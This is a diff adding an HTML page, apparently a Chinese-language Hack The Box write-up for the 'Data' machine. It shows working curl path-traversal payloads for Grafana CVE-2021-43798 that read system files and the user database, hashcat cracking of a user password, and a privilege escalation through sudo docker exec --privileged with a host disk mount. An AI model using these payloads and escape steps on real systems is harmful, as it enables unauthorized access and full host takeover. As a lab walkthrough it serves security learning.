@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Data — 完整攻略</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">📊</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='data'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-dt','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-dt')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Data</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>22 · 3000</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Grafana CVE-2021-43798 路径穿越 → grafana.db → PBKDF2 破解</span><span class="chain-arrow">→</span><span class="chain-node red">sudo docker exec --privileged → mount 宿主机磁盘 → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- 10.129.27.126 -T4</span>
+<span class="output">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+<span class="highlight">3000/tcp open  ppp?    (Grafana v8.0.0)</span></span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点：Grafana 路径穿越 → 密码破解</h2></div>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 插件目录往上爬</span>
+Grafana 的插件目录 <code>/public/plugins/插件名/</code> 是公开的。加上 <code>..%2F</code>（URL 编码的 <code>../</code>）就能往上级目录爬，读到系统上的任何文件。就像餐厅允许你去取餐区拿食物，但你沿着走廊一直走到了后厨甚至保险箱。
+</div>
+
+<h3>CVE-2021-43798 路径穿越</h3>
+<pre><code><span class="comment"># 确认漏洞</span>
+<span class="cmd">$ curl 'http://10.129.27.126:3000/public/plugins/mysql/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'</span>
+
+<span class="comment"># 发现是 Docker 容器</span>
+<span class="cmd">$ curl '...%2Fetc%2Fhostname'</span>
+<span class="output"><span class="highlight">e6ff5b1cbc85</span></span>
+
+<span class="comment"># 下载 Grafana 数据库</span>
+<span class="cmd">$ curl 'http://10.129.27.126:3000/public/plugins/zipkin/../../../../../../../../var/lib/grafana/grafana.db' --path-as-is --output grafana.db</span></code></pre>
+
+<h3>提取用户哈希 & 破解</h3>
+<pre><code><span class="cmd">$ sqlite3 grafana.db</span>
+<span class="cmd">sqlite> select login, password, salt from user;</span>
+<span class="output">admin | 7a919e4bbe95cf5104edf354ee2e6234efac... | YObSoLj55S
+<span class="highlight">boris</span> | dc6becccbb57d34daf4a4e391d2015d3350c... | LCBhdtJWjl</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">Grafana 哈希格式</span>
+PBKDF2-SHA256，10000 轮。数据库中是 hex + 明文 salt，需要转换为 <code>sha256:iterations:base64(salt):base64(hash)</code> 格式给 hashcat（<code>-m 10900</code>）。
+</div>
+
+<pre><code><span class="cmd">$ python3 convert.py > hash.txt</span>
+<span class="cmd">$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output"><span class="highlight">beautiful1</span></span>
+
+<span class="cmd">$ ssh boris@10.129.27.126</span>
+<span class="output">Password: beautiful1</span>
+<span class="cmd">boris@data:~$ cat user.txt</span>
+<span class="output">2cb75c603d8182a63b3b09c6e8435f07</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 2</div><h2>权限提升：Docker 逃逸（挂载宿主机磁盘）</h2></div>
+
+<pre><code><span class="cmd">boris@data:~$ sudo -l</span>
+<span class="output">(root) NOPASSWD: <span class="highlight">/snap/bin/docker exec *</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">🧒 儿童版 — 小房间开门通主控室</span>
+boris 被允许用管理员权限进入 Docker 容器。容器本来是隔离的"小房间"，但我们用 <code>--privileged</code> 参数进去后，可以把宿主机的整个硬盘挂载到容器里——就像在小房间的墙上开了一扇门，直接通到了大楼的主控室。
+</div>
+
+<pre><code><span class="comment"># 以 root + 特权模式进入容器</span>
+<span class="cmd">$ sudo /snap/bin/docker exec -u root --privileged -it e6ff5b1cbc85 bash</span>
+
+<span class="comment"># 挂载宿主机磁盘</span>
+<span class="cmd"># mount /dev/sda1 /mnt</span>
+
+<span class="comment"># 读取 root flag</span>
+<span class="cmd"># cat /mnt/root/root.txt</span>
+<span class="output">ecac10514c5b7ffdcd1e5d55bb6669c3</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Grafana CVE-2021-43798。</strong><p><code>/public/plugins/&lt;插件名&gt;/..%2F..%2F</code> 无需认证即可读取任意文件。首选目标：<code>/var/lib/grafana/grafana.db</code>（用户密码）和 <code>/etc/grafana/grafana.ini</code>（配置）。</p></div>
+<div class="takeaway-item"><strong>Grafana 哈希需要格式转换。</strong><p>PBKDF2-SHA256，数据库中是 hex + 明文 salt。转换为 <code>sha256:10000:base64(salt):base64(hash)</code> 后用 hashcat <code>-m 10900</code>。</p></div>
+<div class="takeaway-item"><strong>Docker --privileged = 逃逸。</strong><p><code>--privileged</code> 让容器拥有宿主机全部设备访问权限。<code>mount /dev/sda1 /mnt</code> 后就能读写宿主机文件系统。</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">Grafana 路径穿越</span><span class="arrow">→</span><span class="node node-green">PBKDF2 破解 → SSH</span><span class="arrow">→</span><span class="node node-red">Docker --privileged → mount → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Data Writeup · 2026</footer>
+</body></html>
